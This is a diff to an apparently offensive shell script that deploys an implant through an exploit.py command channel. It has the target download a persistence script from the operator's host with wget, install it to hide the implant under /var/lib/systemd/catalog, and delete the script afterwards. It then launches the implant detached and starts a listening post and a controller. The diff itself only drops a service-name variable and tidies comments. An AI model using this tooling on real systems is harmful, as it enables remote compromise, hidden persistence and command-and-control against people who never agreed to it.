@@ -52,9 +52,8 @@ IMPLANT_NAME=$(basename "$IMPLANT_FILE")
 PERSIST_NAME=$(basename "$PERSISTENCE_SCRIPT")
 REMOTE_DIR="/var/lib/systemd/catalog"
 REMOTE_IMPLANT="$REMOTE_DIR/$IMPLANT_NAME"
-SERVICE_NAME="systemd-network-helper"
 
-# Helper: send command via exploit.py
+# Helper to send command via exploit.py
 send_cmd() {
     python3 exploit.py "http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/" "$1"
 }
@@ -77,8 +76,8 @@ echo "[*] Uploading persistence script..."
 send_cmd "wget -q http://$LOCAL_IP:$PORT/$PERSIST_NAME -O /tmp/$PERSIST_NAME"
 send_cmd "chmod +x /tmp/$PERSIST_NAME"
 
-echo "[*] Installing persistence (requires root)..."
-send_cmd "/tmp/$PERSIST_NAME -n $SERVICE_NAME -b $REMOTE_IMPLANT -d 'Network Helper Daemon' -a network.target"
+echo "[*] Installing persistence..."
+send_cmd "/tmp/$PERSIST_NAME -b $REMOTE_IMPLANT"
 send_cmd "rm -f /tmp/$PERSIST_NAME"
 echo "[+] Persistence installed."
 
@@ -91,7 +90,8 @@ echo "[*] Launching implant now..."
 timeout 5 bash -c "python3 exploit.py 'http://${TARGET_IP}:${TARGET_PORT}/${TARGET_ENDPOINT}/' 'setsid nohup $REMOTE_IMPLANT >/dev/null 2>&1 &'" || true
 echo "[+] Implant is running."
 
-# 4. Start listening post 
+
+# 4. Start listening post
 if [ -n "$LISTENING_POST" ]; then
     LP_DIR=$(dirname "$LISTENING_POST")
     LP_FILE=$(basename "$LISTENING_POST")
@@ -102,7 +102,7 @@ if [ -n "$LISTENING_POST" ]; then
 fi
 
 
-# 5. Start controller 
+# 5. Start controller
 if [ -n "$CONTROLLER" ]; then
     CTRL_DIR=$(dirname "$CONTROLLER")
     CTRL_FILE=$(basename "$CONTROLLER")
